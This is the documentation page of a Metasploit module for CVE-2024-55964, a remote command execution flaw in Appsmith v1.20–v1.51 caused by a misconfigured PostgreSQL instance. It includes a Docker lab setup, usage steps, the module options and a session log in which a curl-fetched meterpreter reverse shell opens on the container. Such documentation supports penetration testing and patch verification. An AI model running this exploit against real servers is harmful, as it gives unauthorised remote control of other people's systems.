## Vulnerable Application

An incorrectly configured PostgreSQL instance in the Appsmith image leads to remote command execution inside the Appsmith Docker container.

The vulnerability affects:

    * v1.20 <= Appsmith <= v1.51

This module was successfully tested on:

    * Appsmith v1.50 installed with Docker


### Installation

1. Create a docker-compose.yml file with:
```
version: "3"
services:
   appsmith:
     image: index.docker.io/appsmith/appsmith-ce:v1.50
     container_name: appsmith
     ports:
         - "80:80"
         - "443:443"
     volumes:
         - ./stacks:/appsmith-stacks
     restart: unless-stopped
```

2. `docker-compose up`


## Verification Steps

1. Install the application
2. Start msfconsole
3. Do: `use exploit/linux/http/appsmith_rce_cve_2024_55964`
4. Do: `run lhost=<lhost> rhost=<rhost>`
5. You should get a meterpreter


## Options


## Scenarios
```
msf6 > use exploit/linux/http/appsmith_rce_cve_2024_55964
[*] Using configured payload cmd/linux/http/x64/meterpreter_reverse_tcp
msf6 exploit(linux/http/appsmith_rce_cve_2024_55964) > options

Module options (exploit/linux/http/appsmith_rce_cve_2024_55964):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    443              yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                     no        HTTP server virtual host


Payload options (cmd/linux/http/x64/meterpreter_reverse_tcp):

   Name                Current Setting  Required  Description
   ----                ---------------  --------  -----------
   FETCH_COMMAND       CURL             yes       Command to fetch payload (Accepted: CURL, FTP, TFTP, TNFTP, WGET)
   FETCH_DELETE        true             yes       Attempt to delete the binary after execution
   FETCH_FILENAME      XIYHCHbc         no        Name to use on remote system when storing payload; cannot contain spaces or slashes
   FETCH_SRVHOST                        no        Local IP to use for serving payload
   FETCH_SRVPORT       8080             yes       Local port to use for serving payload
   FETCH_URIPATH                        no        Local URI to use for serving payload
   FETCH_WRITABLE_DIR                   yes       Remote writable dir to store payload; cannot contain spaces
   LHOST                                yes       The listen address (an interface may be specified)
   LPORT               4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Linux Command



View the full module info with the info, or info -d command.

msf6 exploit(linux/http/appsmith_rce_cve_2024_55964) > run lhost=172.18.0.1 rhost=172.18.0.2 rport=80
[*] Started reverse TCP handler on 172.18.0.1:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Version 1.50 detected.
[*] Successfully signed up.
[*] Successfully saved DB configuration.
[*] Meterpreter session 1 opened (172.18.0.1:4444 -> 172.18.0.2:56752) at 2025-04-05 14:41:08 +0900

meterpreter > getuid
Server username: postgres
meterpreter > sysinfo
Computer     : 172.18.0.2
OS           : Ubuntu 20.04 (Linux 6.6.15-amd64)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > 
```
